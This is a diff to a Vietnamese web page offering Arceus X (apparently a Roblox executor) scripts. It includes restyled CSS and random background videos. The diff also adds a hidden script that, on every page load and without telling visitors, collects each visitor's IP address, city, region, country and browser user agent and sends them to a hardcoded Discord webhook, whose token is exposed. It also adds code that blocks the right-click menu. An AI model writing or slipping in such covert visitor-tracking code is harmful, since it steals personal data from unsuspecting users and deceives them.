@@ -3,51 +3,54 @@
 <head>
   <meta charset="UTF-8">
   <title>Các công cụ hỗ trợ Arceus X</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
       padding: 0;
       height: 100%;
-      overflow: hidden;
       font-family: Arial, sans-serif;
       color: white;
+      background-color: black;
       display: flex;
       align-items: center;
       justify-content: center;
-      background-color: black;
+      overflow: hidden;
     }
 
     #bg-video {
       position: fixed;
       top: 0;
       left: 0;
-      min-width: 100vw;
-      min-height: 100vh;
-      z-index: -1;
+      width: 100vw;
+      height: 100vh;
       object-fit: cover;
+      z-index: -1;
+      pointer-events: none; /* ngăn nhấn giữ video */
     }
 
     .container {
-      width: 90%;
-      max-width: 700px;
-      padding: 30px 25px;
-      background: rgba(0, 0, 0, 0.65);
+      width: 95%;
+      max-width: 800px;
+      padding: 30px;
+      background: rgba(0, 0, 0, 0.7);
       border-radius: 15px;
-      box-shadow: 0 0 20px #00ffff88;
+      box-shadow: 0 0 25px #00ffff88;
+      backdrop-filter: blur(6px);
     }
 
     h1 {
       text-align: center;
       color: cyan;
-      font-size: 30px;
+      font-size: 32px;
       margin-bottom: 20px;
     }
 
     .card {
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.65);
       margin: 15px 0;
       padding: 15px;
-      border-left: 4px solid cyan;
+      border-left: 5px solid cyan;
       border-radius: 8px;
     }
 
@@ -84,18 +87,19 @@
     }
 
     button:hover {
-      background-color: #00f0f0;
+      background-color: #00e0e0;
     }
   </style>
 </head>
 <body>
 
-  <!-- Video nền có âm thanh, tự chạy -->
-  <video id="bg-video" autoplay loop playsinline muted>
+  <!-- Nền video -->
+  <video id="bg-video" autoplay loop muted playsinline>
     <source src="" type="video/mp4">
     Trình duyệt không hỗ trợ video.
   </video>
 
+  <!-- Nội dung chính -->
   <div class="container">
     <h1>Các công cụ hỗ trợ Arceus X</h1>
 
@@ -121,26 +125,58 @@
   </div>
 
   <script>
+    // Danh sách video nền
     const videoSources = [
-      "https://v1.pinimg.com/videos/iht/expMp4/a7/9b/2d/a79b2df8b2fefbbcc3a5ec0d32e0ccc0_720w.mp4",
-      "https://v1.pinimg.com/videos/iht/expMp4/ca/f9/c0/caf9c066b9adee71afeed8de8b8cc18c_720w.mp4",
-      "https://v1.pinimg.com/videos/iht/expMp4/f1/e7/69/f1e7697c421077b43f931265ba1b717e_720w.mp4",
-      "https://v1.pinimg.com/videos/iht/720p/72/f2/b2/72f2b2b305ef9fb941d1b05e07793066.mp4",
-      "https://v1.pinimg.com/videos/mc/720p/91/77/47/917747d4ae76d3a9c5d9e727b5f6080a.mp4"
-    ];
-
+  "https://v1.pinimg.com/videos/iht/expMp4/a7/9b/2d/a79b2df8b2fefbbcc3a5ec0d32e0ccc0_720w.mp4",
+  "https://v1.pinimg.com/videos/iht/expMp4/ca/f9/c0/caf9c066b9adee71afeed8de8b8cc18c_720w.mp4",
+  "https://v1.pinimg.com/videos/iht/expMp4/f1/e7/69/f1e7697c421077b43f931265ba1b717e_720w.mp4",
+  "https://v1.pinimg.com/videos/iht/720p/72/f2/b2/72f2b2b305ef9fb941d1b05e07793066.mp4",
+  "https://v1.pinimg.com/videos/mc/720p/91/77/47/917747d4ae76d3a9c5d9e727b5f6080a.mp4",
+  "https://v1.pinimg.com/videos/mc/720p/65/d7/97/65d797f38c7af9a9b4b744b0f5e9f829.mp4"
+];
     const randomIndex = Math.floor(Math.random() * videoSources.length);
     const bgVideo = document.getElementById('bg-video');
     bgVideo.querySelector('source').src = videoSources[randomIndex];
     bgVideo.load();
     bgVideo.play();
 
+    // Sao chép Script
     function copyScript() {
       const text = document.querySelector("textarea");
       text.select();
       document.execCommand("copy");
       alert("Đã sao chép Script!");
     }
+
+    // Ngăn chuột phải & giữ video
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.getElementById("bg-video").addEventListener("touchstart", e => e.preventDefault());
+
+    // Gửi IP, trình duyệt và khu vực về Discord Webhook
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const info = {
+          content: "👀 Truy cập mới",
+          embeds: [
+            {
+              title: "Thông tin truy cập",
+              color: 16776960,
+              fields: [
+                { name: "🌐 IP", value: data.ip, inline: true },
+                { name: "📍 Khu vực", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
+                { name: "🕵️ Trình duyệt", value: navigator.userAgent }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        };
+        fetch("https://discord.com/api/webhooks/1291224256721457253/TPaVwWRWJLfIM0tJu8Kcr5b0A9K-gmLW1ANGkdHsJcwiBGsN801HoygA9E20cPLl5lA0", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(info)
+        });
+      });
   </script>
 </body>
 </html>
